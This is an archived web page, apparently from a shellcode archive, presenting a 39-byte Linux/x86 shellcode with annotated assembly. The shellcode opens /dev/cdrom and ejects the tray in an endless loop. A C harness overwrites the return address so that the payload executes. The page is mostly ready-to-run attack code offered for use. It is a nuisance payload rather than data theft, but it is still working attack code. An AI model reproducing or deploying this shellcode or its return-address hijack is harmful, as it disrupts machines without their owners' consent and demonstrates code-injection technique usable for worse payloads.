<html><head><title>Linux/x86 - open cd-rom loop (follows /dev/cdrom symlink) - 39 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * (linux/x86) 24/7 open cd-rom loop (follows &quot;/dev/cdrom&quot; symlink) - 39 bytes
 * - izik &lt;izik@tty64.org&gt;
 */

char shellcode[] = 

	&quot;\x6a\x05&quot;              // push $0x5 
	&quot;\x58&quot;                  // pop %eax 
	&quot;\x31\xc9&quot;              // xor %ecx,%ecx 
	&quot;\x51&quot;                  // push %ecx 
	&quot;\xb5\x08&quot;              // mov $0x8,%ch 
	&quot;\x68\x64\x72\x6f\x6d&quot;  // push $0x6d6f7264 
	&quot;\x68\x65\x76\x2f\x63&quot;  // push $0x632f7665 
	&quot;\x68\x2f\x2f\x2f\x64&quot;  // push $0x642f2f2f 
	&quot;\x89\xe3&quot;              // mov %esp,%ebx 
	&quot;\xcd\x80&quot;              // int $0x80 
	&quot;\x89\xc3&quot;              // mov %eax,%ebx 
	&quot;\x66\xb9\x09\x53&quot;      // mov $0x5309,%cx 
	
	//
	// &lt;_openit&gt;:
	//

	&quot;\xb0\x36&quot;              // mov $0x36,%al 
	&quot;\xcd\x80&quot;              // int $0x80 
	&quot;\xeb\xfa&quot;;             // jmp &lt;_openit&gt;

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&amp;ret + 2;
	(*ret) = (int) shellcode;
}




<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
